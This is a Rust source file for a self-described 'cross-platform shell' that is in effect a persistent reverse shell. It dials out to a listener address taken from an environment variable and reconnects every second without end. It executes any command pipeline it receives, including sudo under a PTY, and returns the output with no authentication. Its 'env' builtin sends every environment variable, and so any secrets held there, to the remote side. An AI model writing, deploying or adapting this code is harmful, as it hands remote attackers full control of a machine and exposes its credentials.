//! A cross-platform shell that can parse simple pipelines *or*
//! launch an interactive PTY for commands like `sudo`, `vim`, etc.,
//! and reconnect if the TCP connection breaks.

use std::env;
use std::io::{self, BufRead, BufReader, Read, Write};
use std::net::{Shutdown, TcpStream};
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::thread;
use std::time::Duration;

use signal_hook::iterator::Signals;
use signal_hook::consts::signal::{SIGINT, SIGTSTP};

use glob::glob;

use net_utils::exports::CommandSpec;
#[cfg(unix)]
use net_utils::net::unix_pty;
#[cfg(windows)]
use net_utils::net::win_pty;

#[cfg(windows)]
use crate::win_pty_big;
static INTERACTIVE_CMDS: &[&str] = &["vim", "nano", "less", "more", "sudo", "vi"];

fn main() -> io::Result<()> {
    let address = env::var("LISTENER_ADDRESS")
        .unwrap_or_else(|_| "127.0.0.1:8080".to_string());

    loop {
        eprintln!("(shell) Attempting to connect to {}", address);
        match TcpStream::connect(&address) {
            Ok(stream) => {
                eprintln!("(shell) Connected to {}", address);

                // Attempt to install signal handler (non-fatal if it fails)
                if let Err(e) = setup_signal_handler(&stream) {
                    eprintln!("(shell) WARNING: Could not set up signal handler: {}", e);
                }

                // Start our main interactive loop
                if let Err(err) = shell_loop(stream) {
                    eprintln!("(shell) Error in session: {}", err);
                }
                eprintln!("(shell) Connection ended. Will reconnect...");
            }
            Err(e) => {
                eprintln!("(shell) Connection error: {}. Retrying in 1s...", e);
                thread::sleep(Duration::from_secs(1));
            }
        }
    }
}

/// Forward local signals (Ctrl+C, etc.) up the chain if desired.
fn setup_signal_handler(stream: &TcpStream) -> io::Result<()> {
    let mut signals = Signals::new(&[SIGINT, SIGTSTP])?;
    let mut stream_clone = stream.try_clone()?;
    thread::spawn(move || {
        for sig in signals.forever() {
            let msg = match sig {
                SIGINT => "[signal] SIGINT\n",
                SIGTSTP => "[signal] SIGTSTP\n",
                _ => continue,
            };
            let _ = stream_clone.write_all(msg.as_bytes());
        }
    });
    Ok(())
}

/// Main shell loop: read lines from TCP, parse, run commands, etc.
fn shell_loop(mut stream: TcpStream) -> io::Result<()> {
    let mut reader = BufReader::new(stream.try_clone()?);

    // Greet them
    writeln!(stream, "Welcome to the cross-platform shell!")?;
    writeln!(stream, "Type 'help' or 'exit'.")?;
    stream.flush()?;

    loop {
        // Prompt
        write!(stream, "rust-sh> ")?;
        stream.flush()?;

        // Read a line
        let mut line = String::new();
        let n = reader.read_line(&mut line)?;
        if n == 0 {
            eprintln!("(shell) Remote closed connection.");
            break;
        }
        let line = line.trim_end();
        if line.is_empty() {
            continue;
        }
        if line.eq_ignore_ascii_case("exit") {
            writeln!(stream, "Bye!")?;
            stream.flush()?;
            break;
        }

        // Parse
        let pipeline = match handle_line(line) {
            Ok(p) => p,
            Err(e) => {
                writeln!(stream, "Parse error: {}", e)?;
                continue;
            }
        };

        // If the pipeline is just 1 command, and that command is interactive
        // (e.g. "vim"), spawn in a PTY. Otherwise, do normal pipeline logic.
        if pipeline.len() == 1 && is_interactive_command(&pipeline[0]) {
            #[cfg(unix)]
            {
                // We'll drop into a PTY session for that command
                let cmd = &pipeline[0];
                unix_pty::run_in_pty(cmd, &mut stream)?;
            }
            #[cfg(windows)]
            {
                let cmd = &pipeline[0];
                win_pty::run_in_pty(cmd, &mut stream)?;
            }
        } else {
            // Non-interactive pipeline
            if let Err(e) = run_pipeline(&pipeline, &mut stream) {
                writeln!(stream, "Error: {}", e).ok();
            }
        }
    }

    Ok(())
}

fn is_interactive_command(cmd: &CommandSpec) -> bool {
    let base = cmd.argv[0].to_lowercase();
    INTERACTIVE_CMDS.contains(&base.as_str())
}



pub type Pipeline = Vec<CommandSpec>;

fn handle_line(line: &str) -> Result<Pipeline, String> {
    let tokens = shell_tokenize(line)?;

    // 2) split on '|'
    let mut commands = Vec::new();
    let mut current = Vec::new();
    for token in tokens {
        if token == "|" {
            if !current.is_empty() {
                commands.push(current);
            }
            current = Vec::new();
        } else {
            current.push(token);
        }
    }
    if !current.is_empty() {
        commands.push(current);
    }

    let mut pipeline = Vec::new();
    for cmd_tokens in commands {
        pipeline.push(parse_one_command(cmd_tokens)?);
    }

    Ok(pipeline)
}

fn parse_one_command(tokens: Vec<String>) -> Result<CommandSpec, String> {
    let mut argv = Vec::new();
    let mut redirect_in = None;
    let mut redirect_out = None;
    let mut redirect_out_append = None;
    let mut redirect_err = None;
    let mut redirect_err_append = None;

    let mut i = 0;
    while i < tokens.len() {
        let t = &tokens[i];
        if t == "<" {
            i += 1;
            if i >= tokens.len() {
                return Err("Missing filename after '<'".into());
            }
            redirect_in = Some(tokens[i].clone());
        } else if t == ">" {
            i += 1;
            if i >= tokens.len() {
                return Err("Missing filename after '>'".into());
            }
            redirect_out = Some(tokens[i].clone());
        } else if t == ">>" {
            i += 1;
            if i >= tokens.len() {
                return Err("Missing filename after '>>'".into());
            }
            redirect_out_append = Some(tokens[i].clone());
        } else if t == "2>" {
            i += 1;
            if i >= tokens.len() {
                return Err("Missing filename after '2>'".into());
            }
            redirect_err = Some(tokens[i].clone());
        } else if t == "2>>" {
            i += 1;
            if i >= tokens.len() {
                return Err("Missing filename after '2>>'".into());
            }
            redirect_err_append = Some(tokens[i].clone());
        } else {
            argv.push(t.clone());
        }
        i += 1;
    }

    if argv.is_empty() {
        return Err("Empty command".into());
    }

    Ok(CommandSpec {
        argv,
        redirect_in,
        redirect_out,
        redirect_out_append,
        redirect_err,
        redirect_err_append,
    })
}

fn shell_tokenize(line: &str) -> Result<Vec<String>, String> {
    let mut tokens = Vec::new();
    let mut current = String::new();
    let mut chars = line.chars().peekable();

    enum State {
        Normal,
        InSingleQuote,
        InDoubleQuote,
    }
    let mut state = State::Normal;

    while let Some(ch) = chars.next() {
        match state {
            State::Normal => match ch {
                ' ' | '\t' => {
                    if !current.is_empty() {
                        // expand
                        let expanded = expand_token(&current)?;
                        tokens.extend(expanded);
                        current.clear();
                    }
                }
                '|' => {
                    if !current.is_empty() {
                        let expanded = expand_token(&current)?;
                        tokens.extend(expanded);
                        current.clear();
                    }
                    tokens.push("|".to_string());
                }
                '<' => {
                    if !current.is_empty() {
                        let expanded = expand_token(&current)?;
                        tokens.extend(expanded);
                        current.clear();
                    }
                    tokens.push("<".to_string());
                }
                '>' => {
                    if !current.is_empty() {
                        let expanded = expand_token(&current)?;
                        tokens.extend(expanded);
                        current.clear();
                    }
                    // peek next for >>?
                    if let Some(&nch) = chars.peek() {
                        if nch == '>' {
                            chars.next();
                            tokens.push(">>".to_string());
                        } else {
                            tokens.push(">".to_string());
                        }
                    } else {
                        tokens.push(">".to_string());
                    }
                }
                '2' => {
                    // detect 2> or 2>> 
                    if !current.is_empty() {
                        let expanded = expand_token(&current)?;
                        tokens.extend(expanded);
                        current.clear();
                    }
                    if let Some(&nch) = chars.peek() {
                        if nch == '>' {
                            chars.next();
                            // check next for '>'
                            if let Some(&nn) = chars.peek() {
                                if nn == '>' {
                                    chars.next();
                                    tokens.push("2>>".to_string());
                                } else {
                                    tokens.push("2>".to_string());
                                }
                            } else {
                                tokens.push("2>".to_string());
                            }
                        } else {
                            // just '2'
                            current.push('2');
                        }
                    } else {
                        current.push('2');
                    }
                }
                '\'' => {
                    // single quote
                    state = State::InSingleQuote;
                }
                '"' => {
                    // double quote
                    state = State::InDoubleQuote;
                }
                _ => {
                    current.push(ch);
                }
            },
            State::InSingleQuote => {
                if ch == '\'' {
                    state = State::Normal;
                } else {
                    current.push(ch);
                }
            }
            State::InDoubleQuote => {
                if ch == '"' {
                    state = State::Normal;
                } else if ch == '\\' {
                    if let Some(nextch) = chars.next() {
                        current.push(nextch);
                    }
                } else {
                    current.push(ch);
                }
            }
        }
    }

    if !current.is_empty() {
        let expanded = expand_token(&current)?;
        tokens.extend(expanded);
    }

    Ok(tokens)
}

/// Expand environment variables and do simple globbing
fn expand_token(token: &str) -> Result<Vec<String>, String> {
    let env_expanded = expand_env(token);
    let results = do_glob(&env_expanded);
    if results.is_empty() {
        Ok(vec![env_expanded])
    } else {
        Ok(results)
    }
}

fn expand_env(text: &str) -> String {
    let mut result = String::new();
    let mut chars = text.chars().peekable();
    while let Some(ch) = chars.peek().cloned() {
        if ch == '$' {
            chars.next();
            let mut varname = String::new();
            while let Some(&c2) = chars.peek() {
                if c2.is_alphanumeric() || c2 == '_' {
                    varname.push(c2);
                    chars.next();
                } else {
                    break;
                }
            }
            if varname.is_empty() {
                result.push('$');
            } else {
                if let Ok(val) = env::var(&varname) {
                    result.push_str(&val);
                }
            }
        } else {
            result.push(ch);
            chars.next();
        }
    }
    result
}

fn do_glob(text: &str) -> Vec<String> {
    if text.contains('*') || text.contains('?') || text.contains('[') {
        if let Ok(paths) = glob(text) {
            return paths.filter_map(Result::ok)
                        .filter_map(|p| p.to_str().map(String::from))
                        .collect();
        }
    }
    vec![]
}

////////////////////////////////////////////////////////////////////////////////
// EXECUTION: pipelines, built-ins, external commands
////////////////////////////////////////////////////////////////////////////////

fn run_pipeline(pipeline: &Pipeline, stream: &mut TcpStream) -> io::Result<()> {
    if pipeline.is_empty() {
        return Ok(());
    }

    // We'll store the "stdout" from the previous stage
    let mut prev_stdout: Option<std::process::ChildStdout> = None;
    let mut children = Vec::new();

    for (i, cmdspec) in pipeline.iter().enumerate() {
        let is_last = i == pipeline.len() - 1;

        if is_builtin(&cmdspec.argv[0]) {
            // If we had a prev_stdout, read it
            let input_data = if let Some(mut pipe_out) = prev_stdout.take() {
                let mut buf = Vec::new();
                let _ = pipe_out.read_to_end(&mut buf);
                buf
            } else {
                Vec::new()
            };
            let output_data = run_builtin(cmdspec, &input_data);
            if is_last {
                stream.write_all(&output_data)?;
            } else {
                writeln!(stream, "[warn] built-in in the middle of pipeline not piped").ok();
            }
        } else {
            // external command
            let bin_path = match resolve_in_path(&cmdspec.argv[0]) {
                Ok(p) => p,
                Err(e) => {
                    writeln!(stream, "Command not found: {} ({})", cmdspec.argv[0], e)?;
                    continue;
                }
            };
            let mut cmd = Command::new(bin_path);
            cmd.args(&cmdspec.argv[1..]);

            // input redirect or pipeline
            if let Some(ref infile) = cmdspec.redirect_in {
                cmd.stdin(Stdio::from(std::fs::File::open(infile)?));
            } else if prev_stdout.is_some() {
                cmd.stdin(Stdio::piped());
            } else {
                cmd.stdin(Stdio::inherit());
            }

            // output redirect
            if let Some(ref outfile) = cmdspec.redirect_out {
                cmd.stdout(Stdio::from(std::fs::OpenOptions::new()
                    .write(true).create(true).truncate(true)
                    .open(outfile)?));
            } else if let Some(ref outfile) = cmdspec.redirect_out_append {
                cmd.stdout(Stdio::from(std::fs::OpenOptions::new()
                    .write(true).create(true).append(true)
                    .open(outfile)?));
            } else {
                cmd.stdout(Stdio::piped());
            }

            // error redirect
            if let Some(ref errfile) = cmdspec.redirect_err {
                cmd.stderr(Stdio::from(std::fs::OpenOptions::new()
                    .write(true).create(true).truncate(true)
                    .open(errfile)?));
            } else if let Some(ref errfile) = cmdspec.redirect_err_append {
                cmd.stderr(Stdio::from(std::fs::OpenOptions::new()
                    .write(true).create(true).append(true)
                    .open(errfile)?));
            } else {
                cmd.stderr(Stdio::piped());
            }

            let mut child = cmd.spawn()?;

            // If we had a prev_stdout, pipe it in
            if let Some(mut reader_pipe) = prev_stdout.take() {
                if let Some(child_in) = child.stdin.take() {
                    thread::spawn(move || {
                        let _ = io::copy(&mut reader_pipe, &mut io::BufWriter::new(child_in));
                    });
                }
            }

            // If last, forward stdout/err to stream
            // If not last, hold onto stdout for next
            if is_last {
                let mut out = child.stdout.take().unwrap();
                let mut err = child.stderr.take().unwrap();
                let mut s_clone = stream.try_clone()?;
                let mut s_clone2 = stream.try_clone()?;
                thread::spawn(move || {
                    let _ = io::copy(&mut out, &mut s_clone);
                });
                thread::spawn(move || {
                    let _ = io::copy(&mut err, &mut s_clone2);
                });
            } else {
                if let Some(out) = child.stdout.take() {
                    prev_stdout = Some(out);
                }
            }
            children.push(child);
        }
    }

    for mut c in children {
        let _ = c.wait();
    }

    Ok(())
}

fn is_builtin(cmd: &str) -> bool {
    matches!(cmd, "cd" | "pwd" | "set" | "unset" | "env" | "help")
}

fn run_builtin(cmdspec: &CommandSpec, _input_data: &[u8]) -> Vec<u8> {
    let argv = &cmdspec.argv;
    let cmd = &argv[0];
    let args = &argv[1..];
    let mut out = Vec::new();

    match cmd.as_str() {
        "cd" => {
            if args.is_empty() {
                writeln!(out, "Usage: cd <dir>").ok();
            } else {
                let dir = &args[0];
                if let Err(e) = env::set_current_dir(dir) {
                    writeln!(out, "cd error: {}", e).ok();
                }
            }
        }
        "pwd" => {
            match env::current_dir() {
                Ok(d) => {
                    writeln!(out, "{}", d.display()).ok();
                }
                Err(e) => {
                    writeln!(out, "pwd error: {}", e).ok();
                }
            }
        }
        "set" => {
            for assignment in args {
                if let Some(eqpos) = assignment.find('=') {
                    let var = &assignment[..eqpos];
                    let val = &assignment[eqpos + 1..];
                    env::set_var(var, val);
                } else {
                    writeln!(out, "Invalid format: {}", assignment).ok();
                }
            }
        }
        "unset" => {
            for var in args {
                env::remove_var(var);
            }
        }
        "env" => {
            for (k, v) in env::vars() {
                writeln!(out, "{}={}", k, v).ok();
            }
        }
        "help" => {
            writeln!(out, "Built-ins: cd, pwd, set, unset, env, help").ok();
            writeln!(out, "Use '|' for pipelines, e.g. `ls | grep foo`.").ok();
            writeln!(out, "Use redirections < > >> 2> 2>> etc.").ok();
            writeln!(out, "Supports quotes, environment expansions, etc.").ok();
            writeln!(out, "Type 'exit' to quit.").ok();
        }
        _ => {
            writeln!(out, "[builtin] not implemented?").ok();
        }
    }
    out
}

fn resolve_in_path(cmd: &str) -> io::Result<String> {
    // if contains / or \, check directly
    if cmd.contains('/') || cmd.contains('\\') {
        if Path::new(cmd).exists() {
            return Ok(cmd.to_string());
        } else {
            return Err(io::Error::new(io::ErrorKind::NotFound, "No such file"));
        }
    }

    if let Ok(path_var) = env::var("PATH") {
        let sep = if cfg!(windows) { ';' } else { ':' };
        for dir in path_var.split(sep) {
            let mut candidate = PathBuf::from(dir);
            candidate.push(cmd);
            if candidate.exists() {
                return Ok(candidate.to_string_lossy().to_string());
            }
        }
    }
    Err(io::Error::new(
        io::ErrorKind::NotFound, 
        format!("{} not found in PATH", cmd)
    ))
}
